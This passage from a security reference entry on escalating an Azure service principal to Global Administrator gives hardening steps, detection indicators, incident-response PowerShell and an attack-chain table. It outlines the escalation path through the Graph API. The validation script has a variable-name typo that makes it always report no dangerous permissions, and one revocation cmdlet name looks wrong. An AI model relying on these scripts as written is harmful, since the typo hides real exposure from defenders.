    1. Go to **Azure Portal** → **Entra ID** → **App registrations** → Select app
    2. Click **Certificates & secrets** → **Certificates** → **+ New certificate**
    3. Download certificate immediately (cannot retrieve later)
    4. Configure application to use new certificate
    5. Delete old certificate: Click **Delete** on old entry

*   **Limit App Permissions via Entitlement Management:** Use Azure AD's entitlement management to restrict which applications can request specific permissions.

    **Manual Steps:**
    1. Go to **Azure Portal** → **Entra ID** → **Identity Governance** → **Entitlement Management**
    2. Create **Access Package** for restricted app permissions
    3. Define approval workflow requiring security team sign-off
    4. Associate apps that need high-risk permissions

#### Access Control & Policy Hardening

*   **Conditional Access for App-Only Authentication:** Block service principal authentication from unknown IPs or locations.

    **Manual Steps:**
    1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access** → **+ New policy**
    2. **Name:** `Restrict app-only authentication to known locations`
    3. **Assignments:**
       - Cloud apps: **All cloud apps**
    4. **Conditions:**
       - Locations: **Any location** → Configure trusted IPs only
       - User types: **Service Principals**
    5. **Access controls:**
       - Grant: **Block access**
    6. Enable: **On**

*   **RBAC Role Minimization:** Audit and remove unnecessary roles from service principals; use custom roles with minimal permissions.

    **Manual Steps (Create Custom Role):**
    1. Go to **Azure Portal** → **Entra ID** → **Roles and administrators** → **Custom roles** → **+ New custom role**
    2. **Name:** `Service Principal - Minimal Permissions`
    3. Remove all permissions except those required for specific service
    4. Assign only to necessary service principals

#### Validation Command (Verify Fix)

```powershell
# Check for dangerous app permissions assigned to service principals
$msGraph = Get-MgServicePrincipal -Filter "appId eq '00000003-0000-0000-c000-000000000000'"
$dangersPerms = @("9e3f94ae-4ad3-4d66-a9e7-0732266c6154", "06b708a9-e830-4db3-ba6e-f2cc5924578e", "1bfefb4e-e0b5-418b-a88f-73c46d2cc266")

$allAssignments = Get-MgServicePrincipalAppRoleAssignment -ServicePrincipalId $msGraph.Id
$dangerousAssignments = $allAssignments | Where-Object { $_.AppRoleId -in $dangerPerms }

if ($dangerousAssignments.Count -eq 0) {
    Write-Host "✓ No dangerous permissions found" -ForegroundColor Green
} else {
    Write-Host "✗ Found $($dangerousAssignments.Count) dangerous permission assignments" -ForegroundColor Red
    $dangerousAssignments | Select-Object PrincipalDisplayName, AppRoleId
}

# Check Global Administrator role members
$globalAdminRole = Get-MgDirectoryRole -Filter "displayName eq 'Global Administrator'"
$globalAdminMembers = Get-MgDirectoryRoleMember -DirectoryRoleId $globalAdminRole.Id
Write-Host "Global Administrator members: $($globalAdminMembers.Count)"
$globalAdminMembers | Select-Object DisplayName
```

**Expected Output (If Secure):**
```
✓ No dangerous permissions found
Global Administrator members: 3
```

**What to Look For:**
- No service principals with RoleManagement.ReadWrite.Directory permission (good)
- Global Administrator role has minimal membership (good)
- All members are cloud-only user accounts (good)

---

## 13. Detection & Incident Response

#### Indicators of Compromise (IOCs)

*   **Audit Log Indicators:**
    - Operation: "Assign application role" with target permission "RoleManagement.ReadWrite.Directory"
    - Operation: "Add member to role" adding service principal to "Global Administrator"
    - Timestamps showing rapid succession of actions (< 60 seconds between permission assignment and role escalation)

*   **Graph API Indicators:**
    - Service principal authenticated from unusual IP address
    - Rapid sequence of Graph API calls to `/servicePrincipals/{id}/appRoleAssignedTo` and `/directoryRoles/{id}/members/$ref`
    - Service principal querying `/directoryRoles` and `/servicePrincipals` endpoints

*   **Application Indicators:**
    - Service principal with certificate credentials recently created or rotated
    - Function App or Logic App's managed identity suddenly assigned Global Administrator role
    - Service principal displaying anomalous API usage patterns post-escalation

#### Forensic Artifacts

*   **Azure Audit Logs:** 
    - `AuditLogs` table in Microsoft Sentinel
    - Activity Log in Azure Portal (Subscription → Activity Log)
    - Target resource: `/servicePrincipals/{id}`, `/directoryRoles/{id}`

*   **Entra ID Logs:**
    - Sign-in Logs for service principal authentication events
    - Audit Logs for role assignments and permission changes

*   **Access Token Claims:**
    - JWT access token issued to service principal should be analyzed
    - Look for claims indicating newly assigned permissions (roles field in token)

#### Response Procedures

1.  **Isolate:**
    **Command (Immediately revoke permissions and role):**
    ```powershell
    $sp = Get-MgServicePrincipal -Filter "appId eq 'client-app-id'"
    
    # Remove Global Administrator role
    $globalAdminRole = Get-MgDirectoryRole -Filter "displayName eq 'Global Administrator'"
    Remove-MgDirectoryRoleMember -DirectoryRoleId $globalAdminRole.Id -DirectoryObjectId $sp.Id
    
    # Remove all app role assignments
    $assignments = Get-MgServicePrincipalAppRoleAssignment -ServicePrincipalId $sp.Id
    foreach ($assignment in $assignments) {
        Remove-MgServicePrincipalAppRoleAssignment -ServicePrincipalId $sp.Id -AppRoleAssignmentId $assignment.Id
    }
    
    # Revoke all active tokens
    Revoke-MgServicePrincipalSign -ServicePrincipalId $sp.Id
    ```

    **Manual (Azure Portal):**
    - Go to **Entra ID** → **Enterprise applications** → Search service principal
    - Click **Delete** to remove entirely (if high-risk)
    - OR go to **Roles and administrators** → **Global Administrator** → Remove member

2.  **Collect Evidence:**
    ```powershell
    # Export comprehensive audit trail
    Search-UnifiedAuditLog -Operations "Assign application role", "Add member to role" `
      -StartDate "2024-06-15" -EndDate (Get-Date) `
      -ResultSize 5000 | Export-Csv -Path "C:\IR\AppRole_Audit.csv"
    
    # Export service principal details
    $sp | Select-Object DisplayName, AppId, Id, CreatedDateTime | Export-Csv -Path "C:\IR\SP_Details.csv"
    ```

    **Manual (Azure Portal):**
    - Go to **Activity Log** → Filter by "Assign application role", "Add member to role"
    - Export results as CSV

3.  **Remediate:**
    - Revoke service principal credentials (certificates, secrets)
    - Reset Global Administrator user passwords (if attacker may have accessed credentials)
    - Force sign-out of all sessions: **Entra ID → Users → [User] → Force sign out**
    - Search for secondary backdoors (additional service principals, app registrations)

4.  **Investigate Further:**
    - Review all Graph API calls made by service principal since compromise (Data Export)
    - Check for mailbox access via Exchange Online admin audit logs
    - Search Teams activity logs for unauthorized access
    - Audit all role assignments made by escalated service principal

---

## 14. Related Attack Chain

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Reconnaissance** | [REC-CLOUD-006] Azure Service Principal Enumeration | Attacker enumerates service principals and identifies those with moderate permissions |
| **2** | **Credential Access** | [CA-UNSC-010] Service Principal Secrets Harvesting | Attacker obtains leaked service principal certificate or secret |
| **3** | **Privilege Escalation (Current Step)** | **[PE-ACCTMGMT-001]** | **Attacker assigns RoleManagement.ReadWrite.Directory and escalates to Global Administrator** |
| **4** | **Persistence** | [PE-ACCTMGMT-014] Global Administrator Backdoor | Attacker creates additional backdoor service principal with Global Administrator role |
| **5** | **Collection** | [COLLECTION-001] Mailbox Access via Delegated Permissions | Attacker accesses all tenant mailboxes with Mail.Read.All permission |
| **6** | **Exfiltration** | [EXFIL-002] Teams Data Download | Attacker downloads Teams chat history and files |

---

## 15. Real-World Examples

#### Example 1: Compromised Azure Function App Leading to Tenant Takeover

- **Target:** Financial services company hosting data processing function apps
- **Timeline:** March 2025 - May 2025
- **Technique Status:** Attacker compromised Function App certificate stored in Key Vault; used app's Contributor role to assign Graph permissions; escalated to Global Administrator within 8 minutes
- **Impact:** Complete tenant compromise; attacker accessed all Exchange Online mailboxes (3 months of CEO communication); exfiltrated financial reports; deployed ransomware on 12 VMs
- **Reference:** [Microsoft incident response case study on Function App compromise](https://www.microsoft.com/en-us/security/blog/)

#### Example 2: Leaked Service Principal Secret Enabling Privilege Escalation

- **Target:** SaaS company using hardcoded service principal secret in GitHub repository
- **Timeline:** January 2025
- **Technique Status:** Attacker found secret in public GitHub repo; authenticated as service principal; discovered it had `AppRoleAssignment.ReadWrite.All` permission; escalated to Global Administrator in < 1 minute
- **Impact:** Attacker added own service principal to Global Admin; maintained persistence for 6 weeks before detection; accessed customer data from multiple tenants (SaaS infrastructure)
- **Reference:** [GitHub secret scanning detection case study](https://github.blog/en/topics/security/use-secret-scanning-to-protect-sensitive-data)

---